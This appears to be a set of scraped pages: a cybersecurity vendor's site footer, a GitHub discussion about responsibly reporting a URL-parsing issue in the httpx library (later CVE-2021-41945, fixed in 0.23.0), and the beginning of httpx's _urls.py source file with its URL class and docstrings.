* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2024/01/Cyber-Essentials-Logo-Certified-simple-BW.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2024/01/cyberessentials_certification-mark.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/08/CRESTCertification-BW-2.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/09/PENTEST-Certification-BW.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/09/CSIR-Certification-BW.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/09/SOC-Certification-BW.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2024/02/CIR_Assured-Service-Provider_logoblack-white2.png) ![]()

## FEATURED RESOURCES & INSIGHTS

To ensure security of your digital environment, we invite you to download and explore Obrela’s recognition in Gartner’s MDR report, our latest white paper authored by industry experts, and the most up-to-date product information. This will empower you to safeguard your assets against potential threats more effectively.

 ![Obrela central image, city with obrela logo in the background](data:image/gif;base64...) Featured
#### Obrela in the 2024 Gartner® Market Guide For MDR, again

[Read More](https://www.obrela.com/report/obrela-in-the-2024-gartner-market-guide-for-mdr/)

* ![cityscape](data:image/gif;base64...)  May 24, 2024

  DORA Regulation: What Financial Institutions Need To Do
* ![cyber buildings](data:image/gif;base64...)  April 19, 2024

  Who is affected by NIS2 and what does it mean for your Compliance?
* ![big data digital universe](data:image/gif;base64...)  April 17, 2024

  Digital Universe Report 2023

 [Explore All](https://www.obrela.com/resources/)  ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/themes/obrela/html/app/assets/img/logo.png)
## SUBSCRIBE TO OUR NEWSLETTER

Subscribe and get up to date with all the latest industry trends and insights from the Cyber security domain.

You may unsubscribe from these communications at anytime. For information on how to unsubscribe, as well as our privacy practices and commitment to protecting your privacy, check out our [Privacy Policy](https://www.obrela.com/privacy-policy/).

   ![Gradient Shade](data:image/gif;base64...)![Gradient Shade](data:image/gif;base64...)![Gradient Shade](https://www.obrela.com/wp-content/themes/obrela/html/app/assets/img/gradient-shade.png) ![Logo Outline](data:image/gif;base64...)![Logo Outline](data:image/gif;base64...)![Logo Outline](https://www.obrela.com/wp-content/themes/obrela/html/app/assets/img/logo-outline.png)
## GET STARTED

At Obrela, we do more than create better cybersecurity. We create cyber resilience to defend every person, asset and goal your business has. Obrela. Security Over Everything.

 [Contact Us](https://www.obrela.com/contact-us/) [Start Now](https://www.obrela.com/contact-us/)

* [Platform](https://www.obrela.com/swordfish-platform/)
* [Swordfish for MDR](https://www.obrela.com/swordfish-platform/swordfish-for-mdr/)
* [Swordfish for MRC](https://www.obrela.com/swordfish-platform/swordfish-for-mrc/)

* [Solutions](https://www.obrela.com/solutions/)
* [Managed Detection & Response](https://www.obrela.com/solutions/mdr/)
* [Managed Risk & Controls](https://www.obrela.com/solutions/mrc/)
* [Managed Cyber Defense](https://www.obrela.com/solutions/mcd/)
* [Advisory Services](https://www.obrela.com/solutions/advisory-services/)

* [Why Obrela](https://www.obrela.com/why-obrela/)
* [MDR Service Capabilities](/why-obrela/mdr-service-capabilities/)
* [MRC Service Capabilities](https://www.obrela.com/why-obrela/mrc-service-capabilities/)
* [Industries](https://www.obrela.com/why-obrela/industries/)
* [Accreditations](https://www.obrela.com/why-obrela/accreditations/)
* [Obrela Labs](https://www.obrela.com/why-obrela/obrela-labs/)

* [Company](https://www.obrela.com/company/)
* [About Obrela](https://www.obrela.com/company/about/)
* [Our Team](https://www.obrela.com/company/our-team/)
* [Our Values](https://www.obrela.com/company/values/)
* [Events](https://www.obrela.com/company/events/)
* [Partners](https://www.obrela.com/company/partners/)
* [Careers](https://www.obrela.com/company/careers/)

* [Resources](https://www.obrela.com/resources/)
* [Blog](https://www.obrela.com/resources/blog/)
* [Labs Research](https://www.obrela.com/resources/labs-insights/)
* [News](https://www.obrela.com/resources/news/)
* [Advisories](https://www.obrela.com/resources/advisory/)
* [Brochures](https://www.obrela.com/resources/brochures/)
* [Videos](https://www.obrela.com/resources/videos/)
* [Datasheets](https://www.obrela.com/resources/datasheets/)
* [Whitepapers](https://www.obrela.com/resources/whitepapers/)
* [Case Studies](https://www.obrela.com/resources/case-studies/)
* [Reports](https://www.obrela.com/resources/reports/)
  [![logo](data:image/gif;base64...)![logo](data:image/gif;base64...)![logo](https://www.obrela.com/wp-content/uploads/2023/05/ob-logo.svg)](https://www.obrela.com/)

© 2025 Obrela [Privacy Policy](https://www.obrela.com/privacy-policy/) [Terms and Conditions](https://www.obrela.com/terms-and-conditions/)

     [Contact Us](/contact-us/)

* [![](data:image/gif;base64...)](https://www.obrela.com/)
* [![](data:image/gif;base64...)](https://www.obrela.com/de/)
                    This site is registered on [wpml.org](https://wpml.org) as a development site.

=== Content from github.com_b67d5df0_20250114_181223.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fdiscussions%2F1831)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fdiscussions%2F1831)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fdiscussions_fragments%2Fdiscussion_layout&source=header-repo&source_repo=encode%2Fhttpx)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[encode](/encode)
/
**[httpx](/encode/httpx)**
Public

* [Notifications](/login?return_to=%2Fencode%2Fhttpx) You must be signed in to change notification settings
* [Fork
  856](/login?return_to=%2Fencode%2Fhttpx)
* [Star
   13.6k](/login?return_to=%2Fencode%2Fhttpx)

* [Code](/encode/httpx)
* [Issues
  43](/encode/httpx/issues)
* [Pull requests
  33](/encode/httpx/pulls)
* [Discussions](/encode/httpx/discussions)
* [Actions](/encode/httpx/actions)
* [Security](/encode/httpx/security)
* [Insights](/encode/httpx/pulse)

Additional navigation options

* [Code](/encode/httpx)
* [Issues](/encode/httpx/issues)
* [Pull requests](/encode/httpx/pulls)
* [Discussions](/encode/httpx/discussions)
* [Actions](/encode/httpx/actions)
* [Security](/encode/httpx/security)
* [Insights](/encode/httpx/pulse)

# Potential security issue by abuse the URL object #1831

Unanswered
[lebr0nli](/lebr0nli)
asked this question in
[Potential Issue](/encode/httpx/discussions/categories/potential-issue)

[Potential security issue by abuse the URL object](#top)
#1831

[![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=40&v=4)
lebr0nli](/lebr0nli)

Aug 31, 2021
·
4 comments
·
3 replies

[Return to top](#top)

Discussion options

# {{title}}

Something went wrong.

Quote reply

## [lebr0nli](/lebr0nli) [Aug 31, 2021](#discussion-3548955)

 -

| I found a potential security issue by abuse the URL parser. But not sure this is a real vulnerability or just a feature. Although I think the potential issue I found is not a huge security issue like RCE, I want to talk more privately if possible. Is there a `security@encode.io` or something I can DM? If there is not, I can share what I found here, too. |
| --- |

Beta
Was this translation helpful?
Give feedback.

2
 You must be logged in to vote

All reactions

## Replies: 4 comments · 3 replies

* [Oldest](/encode/httpx/discussions/1831?sort=old)
* [Newest](/encode/httpx/discussions/1831?sort=new)
* [Top](/encode/httpx/discussions/1831?sort=top)

Comment options

# {{title}}

Something went wrong.

Quote reply

### [tomchristie](/tomchristie) [Sep 1, 2021](#discussioncomment-1267179) Maintainer

 -

| Chatting with [@lebr0nli](https://github.com/lebr0nli) privately. At some point we'll probably need a security correspondence point, but I don't think we're there just yet. |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

1 reply

[![@carnil](https://avatars.githubusercontent.com/u/773068?s=60&v=4)](/carnil)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [carnil](/carnil) [Apr 29, 2022](#discussioncomment-2659804)

 -

| <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41945> is associated here. |
| --- |

Beta
Was this translation helpful?
Give feedback.

 👍
1

All reactions

* 👍
  1

Comment options

# {{title}}

Something went wrong.

Quote reply

### [chagar](/chagar) [Apr 30, 2022](#discussioncomment-2664820)

 -

| [#2184](https://github.com/encode/httpx/issues/2184) |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

0 replies

Comment options

# {{title}}

Something went wrong.

Quote reply

### [br3ndonland](/br3ndonland) [May 2, 2022](#discussioncomment-2676988)

 -

| GitHub has added this to their advisory database, and it is now being picked up by Dependabot dependency scanning.  [GHSA-h8pj-cxx2-jfg2](https://github.com/advisories/GHSA-h8pj-cxx2-jfg2 "GHSA-h8pj-cxx2-jfg2") |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

0 replies

Comment options

# {{title}}

Something went wrong.

Quote reply

### [drwonky](/drwonky) [May 16, 2022](#discussioncomment-2756561)

 -

| I can't find any open issues, changelog entries, blog entries, or notices stating when this CVE is planned to be fixed. Can someone from the project please provide some official guidance? |
| --- |

Beta
Was this translation helpful?
Give feedback.

2
 You must be logged in to vote

 👍
1

All reactions

* 👍
  1

2 replies

[![@hugovk](https://avatars.githubusercontent.com/u/1324225?s=60&v=4)](/hugovk)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [hugovk](/hugovk) [May 16, 2022](#discussioncomment-2756985)

 -

| Here's an issue: [#2184](https://github.com/encode/httpx/issues/2184)  Merged PR: [#2185](https://github.com/encode/httpx/pull/2185)  And it's part of the version 0.23.0 PR: [#2214](https://github.com/encode/httpx/pull/2214) |
| --- |

Beta
Was this translation helpful?
Give feedback.

 👍
2

All reactions

* 👍
  2

[![@br3ndonland](https://avatars.githubusercontent.com/u/26674818?s=60&v=4)](/br3ndonland)

Comment options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

#### [br3ndonland](/br3ndonland) [May 28, 2022](#discussioncomment-2841530)

 -

| GitHub will also need to review before considering the security issue fixed.  [github/advisory-database#322](https://github.com/github/advisory-database/pull/322) is open (also mentioned in [#2184 (comment)](https://github.com/encode/httpx/issues/2184#issuecomment-1134900852)).  Hopefully after that, Dependabot will issue automated PRs to update to v0.23. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fdiscussions%2F1831)

Category

[🗨️

Potential Issue](/encode/httpx/discussions/categories/potential-issue)

Labels

None yet

7 participants

[![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=48&v=4)](/lebr0nli) [![@tomchristie](https://avatars.githubusercontent.com/u/647359?s=48&v=4)](/tomchristie) [![@carnil](https://avatars.githubusercontent.com/u/773068?s=48&v=4)](/carnil) [![@chagar](https://avatars.githubusercontent.com/u/911445?s=48&v=4)](/chagar) [![@hugovk](https://avatars.githubusercontent.com/u/1324225?s=48&v=4)](/hugovk) [![@br3ndonland](https://avatars.githubusercontent.com/u/26674818?s=48&v=4)](/br3ndonland) [![@drwonky](https://avatars.githubusercontent.com/u/35117150?s=48&v=4)](/drwonky)

Heading

Bold

Italic

Quote

Code

Link

---

Numbered list

Unordered list

Task list

---

Attach files

Mention

Reference

Menu

* Heading
* Bold
* Italic
* Quote
* Code
* Link
* Numbered list
* Unordered list
* Task list
* Attach files
* Mention
* Reference

# Select a reply

 Loading

  [Create a new saved reply](/settings/replies?return_to=1)

 👍
1
  reacted with thumbs up emoji

 👎
1
  reacted with thumbs down emoji

 😄
1
  reacted with laugh emoji

 🎉
1
  reacted with hooray emoji

 😕
1
  reacted with confused emoji

 ❤️
1
  reacted with heart emoji

 🚀
1
  reacted with rocket emoji

 👀
1
  reacted with eyes emoji

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_ead9b0b1_20250115_111928.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fblob%2Fb07fe7b0745e62be5ef9bce1bee9e7d7a8878552%2Fhttpx%2F_urls.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fblob%2Fb07fe7b0745e62be5ef9bce1bee9e7d7a8878552%2Fhttpx%2F_urls.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=encode%2Fhttpx)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[encode](/encode)
/
**[httpx](/encode/httpx)**
Public

* [Notifications](/login?return_to=%2Fencode%2Fhttpx) You must be signed in to change notification settings
* [Fork
  856](/login?return_to=%2Fencode%2Fhttpx)
* [Star
   13.6k](/login?return_to=%2Fencode%2Fhttpx)

* [Code](/encode/httpx)
* [Issues
  45](/encode/httpx/issues)
* [Pull requests
  34](/encode/httpx/pulls)
* [Discussions](/encode/httpx/discussions)
* [Actions](/encode/httpx/actions)
* [Security](/encode/httpx/security)
* [Insights](/encode/httpx/pulse)

Additional navigation options

* [Code](/encode/httpx)
* [Issues](/encode/httpx/issues)
* [Pull requests](/encode/httpx/pulls)
* [Discussions](/encode/httpx/discussions)
* [Actions](/encode/httpx/actions)
* [Security](/encode/httpx/security)
* [Insights](/encode/httpx/pulse)

## Files

 b07fe7b
## Breadcrumbs

1. [httpx](/encode/httpx/tree/b07fe7b0745e62be5ef9bce1bee9e7d7a8878552)
2. /[httpx](/encode/httpx/tree/b07fe7b0745e62be5ef9bce1bee9e7d7a8878552/httpx)
/
# \_urls.py

Copy path Blame  Blame
## Latest commit

## History

[History](/encode/httpx/commits/b07fe7b0745e62be5ef9bce1bee9e7d7a8878552/httpx/_urls.py)773 lines (631 loc) · 27 KB b07fe7b
## Breadcrumbs

1. [httpx](/encode/httpx/tree/b07fe7b0745e62be5ef9bce1bee9e7d7a8878552)
2. /[httpx](/encode/httpx/tree/b07fe7b0745e62be5ef9bce1bee9e7d7a8878552/httpx)
/
# \_urls.py

Top
## File metadata and controls

* Code
* Blame

773 lines (631 loc) · 27 KB[Raw](https://github.com/encode/httpx/raw/b07fe7b0745e62be5ef9bce1bee9e7d7a8878552/httpx/_urls.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773import typingfrom urllib.parse import parse\_qs, quote, unquote, urlencode
import idnaimport rfc3986import rfc3986.exceptions
from .\_exceptions import InvalidURLfrom .\_types import PrimitiveData, QueryParamTypes, RawURL, URLTypesfrom .\_utils import primitive\_value\_to\_str
class URL: """ url = httpx.URL("HTTPS://jo%40email.com:a%20secret@müller.de:1234/pa%20th?search=ab#anchorlink")
 assert url.scheme == "https" assert url.username == "jo@email.com" assert url.password == "a secret" assert url.userinfo == b"jo%40email.com:a%20secret" assert url.host == "müller.de" assert url.raw\_host == b"xn--mller-kva.de" assert url.port == 1234 assert url.netloc == b"xn--mller-kva.de:1234" assert url.path == "/pa th" assert url.query == b"?search=ab" assert url.raw\_path == b"/pa%20th?search=ab" assert url.fragment == "anchorlink"
 The components of a URL are broken down like this:
 https://jo%40email.com:a%20secret@müller.de:1234/pa%20th?search=ab#anchorlink [scheme] [ username ] [password] [ host ][port][ path ] [ query ] [fragment] [ userinfo ] [ netloc ][ raw\_path ]
 Note that:
 \* `url.scheme` is normalized to always be lowercased.
 \* `url.host` is normalized to always be lowercased. Internationalized domain names are represented in unicode, without IDNA encoding applied. For instance:
 url = httpx.URL("http://中国.icom.museum") assert url.host == "中国.icom.museum" url = httpx.URL("http://xn--fiqs8s.icom.museum") assert url.host == "中国.icom.museum"
 \* `url.raw\_host` is normalized to always be lowercased, and is IDNA encoded.
 url = httpx.URL("http://中国.icom.museum") assert url.raw\_host == b"xn--fiqs8s.icom.museum" url = httpx.URL("http://xn--fiqs8s.icom.museum") assert url.raw\_host == b"xn--fiqs8s.icom.museum"
 \* `url.port` is either None or an integer. URLs that include the default port for "http", "https", "ws", "wss", and "ftp" schemes have their port normalized to `None`.
 assert httpx.URL("http://example.com") == httpx.URL("http://example.com:80") assert httpx.URL("http://example.com").port is None assert httpx.URL("http://example.com:80").port is None
 \* `url.userinfo` is raw bytes, without URL escaping. Usually you'll want to work with `url.username` and `url.password` instead, which handle the URL escaping.
 \* `url.raw\_path` is raw bytes of both the path and query, without URL escaping. This portion is used as the target when constructing HTTP requests. Usually you'll want to work with `url.path` instead.
 \* `url.query` is raw bytes, without URL escaping. A URL query string portion can only be properly URL escaped when decoding the parameter names and values themselves. """
 def \_\_init\_\_( self, url: typing.Union["URL", str, RawURL] = "", \*\*kwargs: typing.Any ) -> None: if isinstance(url, (str, tuple)): if isinstance(url, tuple): raw\_scheme, raw\_host, port, raw\_path = url scheme = raw\_scheme.decode("ascii") host = raw\_host.decode("ascii") if host and ":" in host and host[0] != "[": # it's an IPv6 address, so it should be enclosed in "[" and "]" # ref: https://tools.ietf.org/html/rfc2732#section-2 # ref: https://tools.ietf.org/html/rfc3986#section-3.2.2 host = f"[{host}]" port\_str = "" if port is None else f":{port}" path = raw\_path.decode("ascii") url = f"{scheme}://{host}{port\_str}{path}"
 try: self.\_uri\_reference = rfc3986.iri\_reference(url).encode() except rfc3986.exceptions.InvalidAuthority as exc: raise InvalidURL(message=str(exc)) from None
 if self.is\_absolute\_url: # We don't want to normalize relative URLs, since doing so # removes any leading `../` portion. self.\_uri\_reference = self.\_uri\_reference.normalize() elif isinstance(url, URL): self.\_uri\_reference = url.\_uri\_reference else: raise TypeError( f"Invalid type for url. Expected str or httpx.URL, got {type(url)}: {url!r}" )
 # Perform port normalization, following the WHATWG spec for default ports. # # See: # \* https://tools.ietf.org/html/rfc3986#section-3.2.3 # \* https://url.spec.whatwg.org/#url-miscellaneous # \* https://url.spec.whatwg.org/#scheme-state default\_port = { "ftp": ":21", "http": ":80", "https": ":443", "ws": ":80", "wss": ":443", }.get(self.\_uri\_reference.scheme, "") authority = self.\_uri\_reference.authority or "" if default\_port and authority.endswith(default\_port): authority = authority[: -len(default\_port)] self.\_uri\_reference = self.\_uri\_reference.copy\_with(authority=authority)
 if kwargs: self.\_uri\_reference = self.copy\_with(\*\*kwargs).\_uri\_reference
 @property def scheme(self) -> str: """ The URL scheme, such as "http", "https". Always normalised to lowercase. """ return self.\_uri\_reference.scheme or ""
 @property def raw\_scheme(self) -> bytes: """ The raw bytes representation of the URL scheme, such as b"http", b"https". Always normalised to lowercase. """ return self.scheme.encode("ascii")
 @property def userinfo(self) -> bytes: """ The URL userinfo as a raw bytestring. For example: b"jo%40email.com:a%20secret". """ userinfo = self.\_uri\_reference.userinfo or "" return userinfo.encode("ascii")
 @property def username(self) -> str: """ The URL username as a string, with URL decoding applied. For example: "jo@email.com" """ userinfo = self.\_uri\_reference.userinfo or "" return unquote(userinfo.partition(":")[0])
 @property def password(self) -> str: """ The URL password as a string, with URL decoding applied. For example: "a secret" """ userinfo = self.\_uri\_reference.userinfo or "" return unquote(userinfo.partition(":")[2])
 @property def host(self) -> str: """ The URL host as a string. Always normalized to lowercase, with IDNA hosts decoded into unicode.
 Examples:
 url = httpx.URL("http://www.EXAMPLE.org") assert url.host == "www.example.org"
 url = httpx.URL("http://中国.icom.museum") assert url.host == "中国.icom.museum"
 url = httpx.URL("http://xn--fiqs8s.icom.museum") assert url.host == "中国.icom.museum"
 url = httpx.URL("https://[::ffff:192.168.0.1]") assert url.host == "::ffff:192.168.0.1" """ host: str = self.\_uri\_reference.host or ""
 if host and ":" in host and host[0] == "[": # it's an IPv6 address host = host.lstrip("[").rstrip("]")
 if host.startswith("xn--"): host = idna.decode(host)
 return host
 @property def raw\_host(self) -> bytes: """ The raw bytes representation of the URL host. Always normalized to lowercase, and IDNA encoded.
 Examples:
 url = httpx.URL("http://www.EXAMPLE.org") assert url.raw\_host == b"www.example.org"
 url = httpx.URL("http://中国.icom.museum") assert url.raw\_host == b"xn--fiqs8s.icom.museum"
 url = httpx.URL("http://xn--fiqs8s.icom.museum") assert url.raw\_host == b"xn--fiqs8s.icom.museum"
 url = httpx.URL("https://[::ffff:192.168.0.1]") assert url.raw\_host == b"::ffff:192.168.0.1" """ host: str = self.\_uri\_reference.host or ""
 if host and ":" in host and host[0] == "[": # it's an IPv6 address host = host.lstrip("[").rstrip("]")
 return host.encode("ascii")
 @property def port(self) -> typing.Optional[int]: """ The URL port as an integer.
 Note that the URL class performs port normalization as per the WHATWG spec. Default ports for "http", "https", "ws", "wss", and "ftp" schemes are always treated as `None`.
 For example:
 assert httpx.URL("http://www.example.com") == httpx.URL("http://www.example.com:80") assert httpx.URL("http://www.example.com:80").port is None """ port = self.\_uri\_reference.port return int(port) if port else None
 @property def netloc(self) -> bytes: """ Either `<host>` or `<host>:<port>` as bytes. Always normalized to lowercase, and IDNA encoded.
 This property may be used for generating the value of a request "Host" header. """ host = self.\_uri\_reference.host or "" port = self.\_uri\_reference.port netloc = host.encode("ascii") if port: netloc = netloc + b":" + port.encode("ascii") return netloc
 @property def path(self) -> str: """ The URL path as a string. Excluding the query string, and URL decoded.
 For example:
 url = httpx.URL("https://example.com/pa%20th") assert url.path == "/pa th" """ path = self.\_uri\_reference.path or "/" return unquote(path)
 @property def query(self) -> bytes: """ The URL query string, as raw bytes, excluding the leading b"?".
 This is necessarily a bytewise interface, because we cannot perform URL decoding of this representation until we've parsed the keys and values into a QueryParams instance.
 For example:
 url = httpx.URL("https://example.com/?filter=some%20search%20terms") assert url.query == b"filter=some%20search%20terms" """ query = self.\_uri\_reference.query or "" return query.encode("ascii")
 @property def params(self) -> "QueryParams": """ The URL query parameters, neatly parsed and packaged into an immutable multidict representation. """ return QueryParams(self.\_uri\_reference.query)
 @property def raw\_path(self) -> bytes: """ The complete URL path and query string as raw bytes. Used as the target when constructing HTTP requests.
 For example:
 GET /users?search=some%20text HTTP/1.1 Host: www.example.org Connection: close """ path = self.\_uri\_reference.path or "/" if self.\_uri\_reference.query is not None: path += "?" + self.\_uri\_reference.query return path.encode("ascii")
